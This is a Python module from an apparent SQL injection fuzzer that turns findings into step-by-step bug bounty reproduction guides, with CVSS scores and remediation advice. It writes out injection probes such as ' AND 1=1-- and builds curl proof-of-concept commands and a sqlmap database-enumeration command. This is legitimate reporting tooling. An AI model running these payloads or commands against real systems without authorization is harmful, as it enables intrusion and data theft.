"""
manual_repro.py — Step-by-step manual reproduction guide generator.

Given a finding dict (produced by SQLiFuzzer), this module builds a
numbered, human-readable guide that tells you *exactly* how to reproduce
the vulnerability yourself — in a browser, in Burp Suite, or with curl.

Intended for authorized bug bounty use only.
"""

from urllib.parse import urlencode, urlparse, parse_qs, quote_plus


# ---------------------------------------------------------------------------
# Technique metadata
# ---------------------------------------------------------------------------

_TECHNIQUE_META = {
    "E": {
        "name": "Error-Based SQL Injection",
        "confirm_hint": (
            "If the server returns a database error message "
            "(e.g. 'You have an error in your SQL syntax', 'ORA-XXXXX'), "
            "the parameter is vulnerable."
        ),
    },
    "B": {
        "name": "Boolean-Based Blind SQL Injection",
        "confirm_hint": (
            "If the TRUE payload returns the *normal* page content and the "
            "FALSE payload returns noticeably different content (shorter page, "
            "missing records, error block), the parameter is vulnerable."
        ),
    },
    "T": {
        "name": "Time-Based Blind SQL Injection",
        "confirm_hint": (
            "If the server takes significantly longer to respond (≥ the "
            "SLEEP/WAITFOR delay specified in the payload), the parameter is "
            "vulnerable. Repeat 3× to rule out network jitter."
        ),
    },
    "U": {
        "name": "UNION-Based SQL Injection",
        "confirm_hint": (
            "If the response body contains 'null' values or extra data rows "
            "that were not present in the clean request, the parameter is "
            "vulnerable and you may be able to read arbitrary table data."
        ),
    },
}

_INJECTION_POINT_LABELS = {
    "query_string": "URL query-string parameter",
    "form":         "HTML form field",
    "cookie":       "HTTP Cookie value",
    "header":       "HTTP Request header",
    "json_body":    "JSON request body field",
}

# Remediation advice per technique
_REMEDIATION = {
    "E": (
        "Use parameterised queries / prepared statements. "
        "Never concatenate user input into SQL strings. "
        "Enable a WAF rule to block common SQL metacharacters at the edge."
    ),
    "B": (
        "Use parameterised queries / prepared statements. "
        "Apply strict input validation (whitelist expected types/ranges). "
        "Limit application DB account privileges (least privilege)."
    ),
    "T": (
        "Use parameterised queries / prepared statements. "
        "Set aggressive DB query timeouts so blind delay payloads time out "
        "server-side before confirming vulnerability to an attacker."
    ),
    "U": (
        "Use parameterised queries / prepared statements. "
        "Suppress detailed DB error output in production. "
        "Ensure the application DB user cannot access system tables "
        "(information_schema, sysobjects, etc.)."
    ),
}

CWE = "CWE-89"
CWE_URL = "https://cwe.mitre.org/data/definitions/89.html"


# ---------------------------------------------------------------------------
# CVSS v3.1 base scores (approximate per technique)
# ---------------------------------------------------------------------------

_CVSS = {
    "E": 8.8,   # High — data exposed via errors
    "B": 8.1,   # High — blind but fully exploitable
    "T": 7.5,   # High — confirmation only, slower exploitation
    "U": 9.8,   # Critical — full data extraction
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def build_repro_guide(finding: dict) -> dict:
    """
    Return a repro guide dict with these keys:

    - steps          : list[str]  — numbered step strings
    - sqlmap_command : str        — ready-to-run sqlmap one-liner
    - curl_poc       : str        — curl PoC (also stored on finding)
    - remediation    : str
    - cwe            : str        — "CWE-89"
    - cwe_url        : str
    - cvss_score     : float
    - db_engine      : str
    """
    code = finding.get("technique_code", "E")[0].upper()
    meta = _TECHNIQUE_META.get(code, _TECHNIQUE_META["E"])

    url        = finding.get("url", "")
    param      = finding.get("param", "")
    payload    = finding.get("payload", "")
    method     = finding.get("method", "GET").upper()
    ep_type    = finding.get("endpoint_type", "query_string")
    base_value = finding.get("base_value", "")
    cookies    = finding.get("cookies_used", "")
    db_engine  = finding.get("db_engine", "Unknown")
    found_on   = finding.get("found_on", url)

    point_label = _INJECTION_POINT_LABELS.get(ep_type, "parameter")

    steps: list[str] = []

    # Step 1 — Navigate
    steps.append(
        f"Open your browser or Burp Suite and navigate to:\n"
        f"        {found_on}\n"
        f"        (The endpoint that contains the vulnerable {point_label} "
        f"was discovered while crawling this page.)"
    )

    # Step 2 — Locate the parameter
    _location_detail = _build_location_detail(ep_type, param, url, method, base_value)
    steps.append(
        f"Locate the {point_label} named  \"{param}\".\n"
        f"        {_location_detail}\n"
        f"        Its original / baseline value is:  {base_value!r}"
    )

    # Step 3 — Inject the payload
    steps.append(
        f"Replace the value of \"{param}\" with the following payload:\n\n"
        f"        {payload}\n\n"
        f"        This is a {meta['name']} payload targeting {db_engine}."
    )

    # Step 4 — Send and observe
    steps.append(
        f"Send the request and observe the response.\n"
        f"        {meta['confirm_hint']}"
    )

    # Step 5 — Boolean confirmation (for non-boolean techniques)
    if code in ("E", "T", "U"):
        steps.append(
            "Confirm with a safe boolean check to reduce false positives:\n"
            f"        TRUE  payload  (page loads normally):   {base_value}' AND 1=1--\n"
            f"        FALSE payload (page content changes):   {base_value}' AND 1=2--\n"
            "        Send each and compare the response lengths / content."
        )

    # Step 6 — curl PoC
    curl_cmd = _build_curl(url, param, payload, method, cookies)
    finding["curl_poc"] = curl_cmd
    steps.append(
        f"Reproduce the finding with curl (copy-paste ready):\n\n"
        f"        {curl_cmd}"
    )

    # Step 7 — sqlmap
    sqlmap_cmd = _build_sqlmap(url, param, method, cookies)
    finding["sqlmap_command"] = sqlmap_cmd
    steps.append(
        "For deep exploitation on an authorized target, use sqlmap:\n\n"
        f"        {sqlmap_cmd}\n\n"
        "        ⚠  Only run sqlmap on scopes you are explicitly authorized to test."
    )

    # Step 8 — Burp Suite import
    steps.append(
        "To replay / modify in Burp Suite:\n"
        "        1. Copy the curl command from Step 6.\n"
        "        2. In Burp Suite → Repeater, click 'Paste URL' or use\n"
        "           Extensions → Import from curl.\n"
        "        3. Modify the payload in the request editor and click Send."
    )

    return {
        "steps":          steps,
        "sqlmap_command": sqlmap_cmd,
        "curl_poc":       curl_cmd,
        "remediation":    _REMEDIATION.get(code, "Use parameterised queries."),
        "cwe":            CWE,
        "cwe_url":        CWE_URL,
        "cvss_score":     _CVSS.get(code, 8.8),
        "db_engine":      db_engine,
    }


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_location_detail(
    ep_type: str, param: str, url: str, method: str, base_value: str
) -> str:
    if ep_type == "query_string":
        return (
            f"It appears in the URL query string. In your browser address bar "
            f"you can see  {param}={base_value or '<value>'}  in the URL."
        )
    if ep_type == "form":
        return (
            f"It is a hidden/visible field in an HTML <form> submitted via {method}. "
            f"In Burp Suite's Proxy intercept, look for  {param}={base_value or '<value>'}  "
            f"in the request body."
        )
    if ep_type == "cookie":
        return (
            f"It is the value of the  {param}  HTTP cookie. "
            f"In Burp Suite, find it in the  Cookie:  request header. "
            f"In DevTools → Application → Cookies you can edit it directly."
        )
    if ep_type == "header":
        return (
            f"It is the value of the  {param}  HTTP request header. "
            f"Add this header in Burp Suite Repeater or with curl -H '{param}: <payload>'."
        )
    if ep_type == "json_body":
        return (
            f"It is a field in a JSON request body. "
            f"Look for  \"{param}\": \"{base_value or '<value>'}\"  in the request body. "
            f"Set Content-Type: application/json when replaying."
        )
    return f"Look for parameter  {param}  in the {method} request."


def _build_curl(
    url: str, param: str, payload: str, method: str, cookies: str
) -> str:
    """Build a curl command that demonstrates the injection."""
    encoded_payload = quote_plus(payload)

    if method == "GET":
        # Build URL with injected param
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        # Flatten and re-encode
        flat = {k: v[0] for k, v in qs.items()}
        new_query = urlencode(flat)
        injected_url = parsed._replace(query=new_query).geturl()
        cmd = f"curl -sk '{injected_url}'"
    else:
        # POST with --data
        cmd = f"curl -sk -X POST '{url}' --data '{param}={encoded_payload}'"

    if cookies:
        cmd += f" -H 'Cookie: {cookies}'"

    return cmd


def _build_sqlmap(url: str, param: str, method: str, cookies: str) -> str:
    """Build a sqlmap command for full exploitation."""
    cmd = f'sqlmap -u "{url}" -p {param} --dbs --batch --level=3 --risk=2'
    if method == "POST":
        cmd += " --method=POST"
    if cookies:
        cmd += f' --cookie "{cookies}"'
    return cmd
